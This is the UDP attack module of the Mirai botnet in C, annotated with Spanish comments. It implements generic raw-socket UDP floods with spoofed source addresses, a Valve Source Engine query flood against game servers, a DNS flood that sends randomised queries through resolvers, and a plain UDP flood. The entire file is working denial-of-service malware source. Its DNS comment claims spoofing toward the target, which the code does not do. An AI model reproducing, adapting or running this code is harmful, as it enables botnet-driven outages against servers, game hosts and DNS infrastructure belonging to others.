/***************************************************************************
 * Archivo: attack_udp.c
 * 
 * Descripción: Implementación de ataques UDP especializados para Mirai
 * Este módulo implementa varios tipos de ataques UDP:
 * 1. UDP Genérico - Inundación básica de paquetes UDP
 * 2. UDP VSE - Ataque a servidores de Valve usando Source Engine Query
 * 3. UDP DNS - Amplificación de DNS
 * 4. UDP Plain - Inundación UDP usando sockets normales
 * 
 * Características principales:
 * - Generación de paquetes UDP malformados
 * - Spoofing de direcciones IP y puertos
 * - Soporte para ataques a subredes
 * - Amplificación DNS
 * - Opciones UDP personalizables
 * 
 * Referencias:
 * - RFC 768 (UDP)
 * - RFC 1035 (DNS)
 ***************************************************************************/

/* Habilitar extensiones GNU */
#define _GNU_SOURCE

/* Cabeceras del sistema */
#ifdef DEBUG
#include <stdio.h>     /* printf() - Solo para depuración */
#endif
#include <stdlib.h>    /* malloc(), free(), etc */
#include <unistd.h>    /* close() */
#include <sys/socket.h> /* socket(), setsockopt() */
#include <arpa/inet.h>  /* inet_addr() */
#include <linux/ip.h>   /* struct iphdr */
#include <linux/udp.h>  /* struct udphdr */
#include <errno.h>      /* errno, códigos de error */
#include <fcntl.h>      /* O_RDONLY */

/* Cabeceras locales */
#include "includes.h"   /* Definiciones comunes */
#include "attack.h"     /* Estructuras de ataque */
#include "checksum.h"   /* Cálculo de checksums */
#include "rand.h"       /* Generación de números aleatorios */
#include "util.h"       /* Funciones de utilidad */
#include "table.h"      /* Tabla de strings cifrados */
#include "protocol.h"   /* Constantes de protocolos */

static ipv4_t get_dns_resolver(void);

/*
 * Ataque de Inundación UDP Genérico
 * 
 * Implementa un ataque básico de inundación UDP que:
 * - Envía gran volumen de paquetes UDP
 * - Permite personalizar todos los campos del paquete
 * - Soporta spoofing de IP y puertos
 * - Puede generar payload aleatorio
 *
 * @param targs_len    Número de objetivos en el ataque
 * @param targs        Array de estructuras con datos de objetivos
 * @param opts_len     Número de opciones para configurar el ataque
 * @param opts         Array de opciones para personalizar el ataque
 */
void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;

    /* Arreglo de paquetes, uno por objetivo */
    char **pkts = calloc(targs_len, sizeof (char *));

    /* Opciones de la cabecera IP */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);        /* Tipo de servicio */
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); /* ID de paquete */
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);       /* Time to live */
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);     /* No fragmentar */

    /* Opciones de puertos UDP */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);      /* Puerto origen */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);      /* Puerto destino */

    /* Opciones de payload */
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512); /* Tamaño payload */
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);   /* Payload aleatorio */

    /* IP origen (puede ser spoofeada) */
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    /* Limitar tamaño del payload al MTU común menos cabeceras */
    if (data_len > 1460)  /* 1500 - 20 (IP) - 20 (UDP) = 1460 bytes máximo */
        data_len = 1460;

    /* Crear socket raw para enviar paquetes UDP personalizados */
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw. Abortando ataque\n");
#endif
        return;
    }

    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(fd);
        return;
    }

    /* Preparar paquetes para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las cabeceras dentro del paquete */
        struct iphdr *iph;     /* Cabecera IP */
        struct udphdr *udph;   /* Cabecera UDP */

        /* Reservar memoria para el paquete (MTU estándar) */
        pkts[i] = calloc(1510, sizeof (char));
        
        /* Posicionar punteros a las cabeceras */
        iph = (struct iphdr *)pkts[i];              /* IP al inicio */
        udph = (struct udphdr *)(iph + 1);          /* UDP después de IP */

        /* Configurar cabecera IP */
        iph->version = 4;                           /* IPv4 */
        iph->ihl = 5;                              /* Longitud cabecera: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                         /* Tipo de servicio */
        iph->tot_len = htons(sizeof (struct iphdr) + 
                            sizeof (struct udphdr) + data_len); /* Longitud total */
        iph->id = htons(ip_ident);                 /* ID del paquete */
        iph->ttl = ip_ttl;                         /* Time to Live */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);        /* Flag Don't Fragment */
        iph->protocol = IPPROTO_UDP;               /* Protocolo: UDP */
        iph->saddr = source_ip;                    /* IP origen (puede ser spoofeada) */
        iph->daddr = targs[i].addr;                /* IP destino */

        /* Configurar cabecera UDP */
        udph->source = htons(sport);               /* Puerto origen */
        udph->dest = htons(dport);                 /* Puerto destino */
        udph->len = htons(sizeof (struct udphdr) + data_len); /* Longitud UDP + datos */
    }

    /* Bucle principal del ataque */
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Calcular checksum UDP 
             * 1. Poner checksum a 0
             * 2. Calcular checksum usando pseudo-cabecera IP+UDP
             */
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len,
                                        sizeof (struct udphdr) + data_len);

            /* Actualizar puerto destino en estructura de socket */
            targs[i].sock_addr.sin_port = udph->dest;

            /* Enviar el paquete UDP usando socket raw
             * - Tamaño total: IP + UDP + payload
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             */
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, 
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
                   sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}

/*
 * Ataque UDP VSE (Valve Source Engine Query)
 * 
 * Implementa un ataque especializado contra servidores de juegos Valve:
 * - Envía consultas malformadas al puerto del servidor (27015 por defecto)
 * - Usa un payload específico para el protocolo Source Engine
 * - Puede saturar el servidor de juegos procesando consultas
 * - Efectivo contra servidores de CS, TF2, etc.
 *
 * @param targs_len    Número de objetivos en el ataque
 * @param targs        Array de estructuras con datos de objetivos
 * @param opts_len     Número de opciones para configurar el ataque
 * @param opts         Array de opciones para personalizar el ataque
 */
void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;

    /* Arreglo de paquetes, uno por objetivo */
    char **pkts = calloc(targs_len, sizeof (char *));

    /* Opciones de la cabecera IP */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);        /* Tipo de servicio */
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); /* ID de paquete */
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);       /* Time to live */
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);     /* No fragmentar */

    /* Opciones de puertos UDP */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);      /* Puerto origen */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);       /* Puerto destino (27015 por defecto) */

    /* Variables para payload VSE */
    char *vse_payload;         /* Contenido del payload VSE */
    int vse_payload_len;       /* Longitud del payload */

    /* Obtener payload VSE de la tabla cifrada */
    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    /* Crear socket raw para enviar paquetes UDP personalizados */
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw. Abortando ataque\n");
#endif
        return;
    }

    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(fd);
        return;
    }

    /* Preparar paquetes para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros a las secciones del paquete */
        struct iphdr *iph;     /* Cabecera IP */
        struct udphdr *udph;   /* Cabecera UDP */
        char *data;            /* Payload VSE */

        /* Reservar memoria para el paquete */
        pkts[i] = calloc(128, sizeof (char));

        /* Posicionar punteros a las secciones */
        iph = (struct iphdr *)pkts[i];              /* IP al inicio */
        udph = (struct udphdr *)(iph + 1);          /* UDP después de IP */
        data = (char *)(udph + 1);                  /* Payload después de UDP */

        /* Configurar cabecera IP */
        iph->version = 4;                           /* IPv4 */
        iph->ihl = 5;                              /* Longitud cabecera: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                         /* Tipo de servicio */
        iph->tot_len = htons(sizeof (struct iphdr) + 
                            sizeof (struct udphdr) + 
                            sizeof (uint32_t) + vse_payload_len); /* Longitud total */
        iph->id = htons(ip_ident);                 /* ID del paquete */
        iph->ttl = ip_ttl;                         /* Time to Live */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);        /* Flag Don't Fragment */
        iph->protocol = IPPROTO_UDP;               /* Protocolo: UDP */
        iph->saddr = LOCAL_ADDR;                   /* IP origen (local) */
        iph->daddr = targs[i].addr;                /* IP destino */

        /* Configurar cabecera UDP */
        udph->source = htons(sport);               /* Puerto origen */
        udph->dest = htons(dport);                 /* Puerto destino (27015 default) */
        udph->len = htons(sizeof (struct udphdr) + 
                         4 + vse_payload_len);     /* Longitud UDP + datos */

        /* Construir payload VSE
         * - 4 bytes iniciales: 0xFFFFFFFF (magic number)
         * - Resto: payload específico de VSE
         */
        *((uint32_t *)data) = 0xffffffff;          /* Magic number */
        data += sizeof (uint32_t);                  /* Avanzar puntero */
        util_memcpy(data, vse_payload, vse_payload_len); /* Copiar payload */
    }

    /* Bucle principal del ataque */
    while (TRUE)
    {
        /* Iterar por cada objetivo */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a las secciones del paquete */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;          /* Cabecera IP */
            struct udphdr *udph = (struct udphdr *)(iph + 1); /* Cabecera UDP */
            
            /* Para ataques a subred: generar IP aleatoria dentro del rango */
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            /* Aleatorizar campos si se especificó en las opciones */
            if (ip_ident == 0xffff)           /* ID de paquete aleatorio */
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)              /* Puerto origen aleatorio */
                udph->source = rand_next();
            if (dport == 0xffff)              /* Puerto destino aleatorio */
                udph->dest = rand_next();

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Calcular checksum UDP 
             * 1. Poner checksum a 0
             * 2. Calcular checksum usando pseudo-cabecera IP+UDP
             */
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, 
                                        sizeof (struct udphdr) + 
                                        sizeof (uint32_t) + vse_payload_len);

            /* Actualizar puerto destino en estructura de socket */
            targs[i].sock_addr.sin_port = udph->dest;

            /* Enviar el paquete UDP usando socket raw
             * - Tamaño total: IP + UDP + magic number + payload VSE
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             */
            sendto(fd, pkt, sizeof (struct iphdr) + 
                          sizeof (struct udphdr) + 
                          sizeof (uint32_t) + vse_payload_len,
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr,
                   sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}

/*
 * Ataque de Amplificación DNS
 * 
 * Implementa un ataque que abusa del protocolo DNS para generar tráfico amplificado:
 * - Envía consultas DNS a resolvers abiertos
 * - Spoofea la IP origen para que las respuestas vayan al objetivo
 * - Usa consultas que generan respuestas grandes (amplificación)
 * - Puede lograr factores de amplificación de 28x a 54x
 *
 * @param targs_len    Número de objetivos en el ataque
 * @param targs        Array de estructuras con datos de objetivos
 * @param opts_len     Número de opciones para configurar el ataque  
 * @param opts         Array de opciones para personalizar el ataque
 */
void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, fd;

    /* Arreglo de paquetes, uno por objetivo */
    char **pkts = calloc(targs_len, sizeof (char *));

    /* Opciones de la cabecera IP */
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);        /* Tipo de servicio */
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); /* ID de paquete */
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);       /* Time to live */
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);     /* No fragmentar */

    /* Opciones de puertos UDP */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);      /* Puerto origen */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);          /* Puerto destino (53 DNS) */

    /* Opciones específicas DNS */
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff); /* ID de consulta DNS */
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);       /* Tamaño del payload */
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);              /* Dominio a consultar */
    int domain_len;                                                                        /* Longitud del dominio */

    /* Obtener DNS resolver a usar para el ataque */
    ipv4_t dns_resolver = get_dns_resolver();

    /* Validar que se proporcionó un dominio para consultar */
    if (domain == NULL)
    {
#ifdef DEBUG
        printf("Error: No se puede realizar flood DNS sin un dominio\n");
#endif
        return;
    }
    domain_len = util_strlen(domain);  /* Calcular longitud del dominio */

    /* Crear socket raw para enviar paquetes UDP personalizados */
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Error al crear socket raw. Abortando ataque\n");
#endif
        return;
    }

    /* Activar IP_HDRINCL para manipular cabecera IP manualmente */
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Error al configurar IP_HDRINCL. Abortando\n");
#endif
        close(fd);
        return;
    }

    /* Preparar paquetes para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        int ii;                           /* Índice auxiliar para bucles */
        uint8_t curr_word_len = 0;        /* Longitud de la palabra actual en el dominio */
        uint8_t num_words = 0;            /* Número de palabras en el dominio */

        /* Punteros a las secciones del paquete */
        struct iphdr *iph;               /* Cabecera IP */
        struct udphdr *udph;             /* Cabecera UDP */
        struct dnshdr *dnsh;             /* Cabecera DNS */
        char *qname;                     /* Campo QNAME de la consulta DNS */
        char *curr_lbl;                  /* Puntero al label actual en QNAME */
        struct dns_question *dnst;       /* Estructura de pregunta DNS */

        /* Reservar memoria para el paquete (tamaño para consulta DNS completa) */
        pkts[i] = calloc(600, sizeof (char));
        
        /* Posicionar punteros a las secciones */
        iph = (struct iphdr *)pkts[i];               /* IP al inicio */
        udph = (struct udphdr *)(iph + 1);           /* UDP después de IP */
        dnsh = (struct dnshdr *)(udph + 1);          /* DNS después de UDP */
        qname = (char *)(dnsh + 1);                  /* QNAME después de DNS */

        /* Configurar cabecera IP */
        iph->version = 4;                           /* IPv4 */
        iph->ihl = 5;                              /* Longitud cabecera: 5 x 4 = 20 bytes */
        iph->tos = ip_tos;                         /* Tipo de servicio */
        iph->tot_len = htons(sizeof (struct iphdr) + 
                            sizeof (struct udphdr) + 
                            sizeof (struct dnshdr) + 
                            1 + data_len + 2 + 
                            domain_len + 
                            sizeof (struct dns_question)); /* Longitud total */
        iph->id = htons(ip_ident);                 /* ID del paquete */
        iph->ttl = ip_ttl;                         /* Time to Live */
        if (dont_frag)
            iph->frag_off = htons(1 << 14);        /* Flag Don't Fragment */
        iph->protocol = IPPROTO_UDP;               /* Protocolo: UDP */
        iph->saddr = LOCAL_ADDR;                   /* IP origen (local) */
        iph->daddr = dns_resolver;                 /* IP del DNS resolver */

        /* Configurar cabecera UDP */
        udph->source = htons(sport);               /* Puerto origen */
        udph->dest = htons(dport);                 /* Puerto destino (53 DNS) */
        udph->len = htons(sizeof (struct udphdr) + 
                         sizeof (struct dnshdr) + 
                         1 + data_len + 2 + 
                         domain_len + 
                         sizeof (struct dns_question)); /* Longitud UDP + datos */

        /* Configurar cabecera DNS */
        dnsh->id = htons(dns_hdr_id);             /* ID de la consulta */
        dnsh->opts = htons(1 << 8);               /* Activar Recursion Desired */
        dnsh->qdcount = htons(1);                 /* Una pregunta en la consulta */

        /* Llenar área aleatoria antes del dominio */
        *qname++ = data_len;              /* Longitud del área aleatoria */
        qname += data_len;                /* Saltar el área aleatoria */

        /* Preparar área para el dominio */
        curr_lbl = qname;                 /* Inicio del primer label */
        /* Copiar dominio y byte nulo al final */
        util_memcpy(qname + 1, domain, domain_len + 1);

        /* Procesar dominio y escribir longitudes de labels 
         * Formato DNS: [len]label[len]label[len]label[0]
         * Ejemplo: [3]www[6]google[3]com[0]
         */
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')        /* Encontró separador de label */
            {
                *curr_lbl = curr_word_len;  /* Escribir longitud del label anterior */
                curr_word_len = 0;          /* Resetear contador */
                num_words++;                /* Incrementar contador de words */
                curr_lbl = qname + ii + 1;  /* Mover puntero al siguiente label */
            }
            else
                curr_word_len++;            /* Incrementar longitud del label actual */
        }
        *curr_lbl = curr_word_len;        /* Escribir longitud del último label */

        /* Configurar pregunta DNS (después del dominio) */
        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);    /* Consulta por registro A (IPv4) */
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP); /* Clase Internet */
    }

    /* Bucle principal del ataque */
    while (TRUE)
    {
        /* Iterar por cada objetivo */
        for (i = 0; i < targs_len; i++)
        {
            /* Obtener referencias a las secciones del paquete */
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;           /* Cabecera IP */
            struct udphdr *udph = (struct udphdr *)(iph + 1);  /* Cabecera UDP */
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1); /* Cabecera DNS */
            char *qrand = ((char *)(dnsh + 1)) + 1;           /* Área aleatoria */

            /* Aleatorizar campos si se especificó en las opciones */
            if (ip_ident == 0xffff)           /* ID de paquete aleatorio */
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)              /* Puerto origen aleatorio */
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)              /* Puerto destino aleatorio */
                udph->dest = rand_next() & 0xffff;

            /* ID de consulta DNS aleatorio */
            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;

            /* Generar contenido aleatorio antes del dominio */
            rand_alphastr((uint8_t *)qrand, data_len);

            /* Calcular checksum IP
             * 1. Poner checksum a 0
             * 2. Calcular checksum sobre toda la cabecera IP
             */
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            /* Calcular checksum UDP
             * 1. Poner checksum a 0
             * 2. Calcular checksum usando pseudo-cabecera IP+UDP+DNS completo
             */
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len,
                                        sizeof (struct udphdr) + 
                                        sizeof (struct dnshdr) + 
                                        1 + data_len + 2 + 
                                        domain_len + 
                                        sizeof (struct dns_question));

            /* Configurar dirección de envío al DNS resolver */
            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;

            /* Enviar la consulta DNS usando socket raw
             * - Tamaño total: IP + UDP + DNS + datos
             * - MSG_NOSIGNAL: No generar SIGPIPE si hay error
             */
            sendto(fd, pkt, sizeof (struct iphdr) + 
                          sizeof (struct udphdr) + 
                          sizeof (struct dnshdr) + 
                          1 + data_len + 2 + 
                          domain_len + 
                          sizeof (struct dns_question),
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr,
                   sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno); /* Imprimir errno en modo debug */
#endif
    }
}

/*
 * Ataque UDP Plain (Básico)
 * 
 * Implementa un ataque UDP básico usando sockets UDP normales:
 * - No requiere privilegios de root
 * - Un socket por objetivo para enviar datos
 * - Permite payload aleatorio o fijo
 * - Más simple pero menos control que usando sockets raw
 *
 * @param targs_len    Número de objetivos en el ataque
 * @param targs        Array de estructuras con datos de objetivos
 * @param opts_len     Número de opciones para configurar el ataque
 * @param opts         Array de opciones para personalizar el ataque
 */
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("Iniciando ataque UDP plain\n");
#endif

    /* Variables de control */
    int i;
    
    /* Buffers para paquetes y sockets */
    char **pkts = calloc(targs_len, sizeof (char *));  /* Buffer por objetivo */
    int *fds = calloc(targs_len, sizeof (int));        /* Socket por objetivo */

    /* Opciones del ataque */
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);     /* Puerto destino */
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);     /* Puerto origen */
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512); /* Tamaño payload */
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE); /* Payload aleatorio */
    
    /* Estructura para bind() del socket */
    struct sockaddr_in bind_addr = {0};

    /* Manejar puerto origen */
    if (sport == 0xffff)
    {
        sport = rand_next();            /* Puerto origen aleatorio */
    } else {
        sport = htons(sport);           /* Puerto origen específico */
    }

#ifdef DEBUG
    printf("Argumentos procesados\n");
#endif

    /* Configurar sockets y buffers para cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        /* Punteros para el paquete */
        struct iphdr *iph;            /* No usado en UDP plain */
        struct udphdr *udph;          /* No usado en UDP plain */
        char *data;                   /* Buffer para datos */

        /* Reservar buffer para datos (tamaño máximo UDP) */
        pkts[i] = calloc(65535, sizeof (char));

        /* Configurar puerto destino del objetivo */
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();     /* Puerto aleatorio */
        else
            targs[i].sock_addr.sin_port = htons(dport);    /* Puerto específico */

        /* Crear socket UDP normal */
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Error al crear socket UDP. Abortando ataque\n");
#endif
            return;
        }

        /* Configurar dirección para bind()
         * - Familia: IPv4
         * - Puerto: Definido anteriormente
         * - IP: Cualquiera (INADDR_ANY)
         */
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

/*
 * Obtiene la IP de un servidor DNS resolver
 * 
 * Esta función intenta:
 * 1. Leer el resolver local del archivo /etc/resolv.conf
 * 2. Si no lo encuentra, usa uno de los resolvers públicos conocidos:
 *    - Google (8.8.8.8)
 *    - Hurricane Electric (74.82.42.42)
 *    - Verisign (64.6.64.6)
 *    - Level3 (4.2.2.2)
 *
 * @return    Dirección IPv4 del resolver en formato de red (network byte order)
 */
static ipv4_t get_dns_resolver(void)
{
    int fd;

    /* Intentar leer el archivo de resolución DNS */
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];  /* Buffer para el archivo */

        /* Leer contenido del archivo */
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);

        /* Buscar la cadena "nameserver" */
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        
        /* Si encontró "nameserver", extraer la IP */
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];                /* Buffer para la IP */
            BOOL finished_whitespace = FALSE; /* Control de espacios */
            BOOL found = FALSE;             /* Indica si se encontró IP */

            /* Parsear la IP del resolver */
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                /* Saltar espacios iniciales */
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                /* Terminar al encontrar algo que no sea punto o número */
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    /* Copiar la IP encontrada */
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            /* Si se encontró una IP válida, convertirla y retornarla */
            if (found)
            {
#ifdef DEBUG
                printf("Resolver local encontrado: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    /* Si no se pudo obtener el resolver local, usar uno público aleatorio */
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);        /* Google DNS */
    case 1:
        return INET_ADDR(74,82,42,42);    /* Hurricane Electric */
    case 2:
        return INET_ADDR(64,6,64,6);      /* Verisign */
    case 3:
        return INET_ADDR(4,2,2,2);        /* Level3 */
    }
}
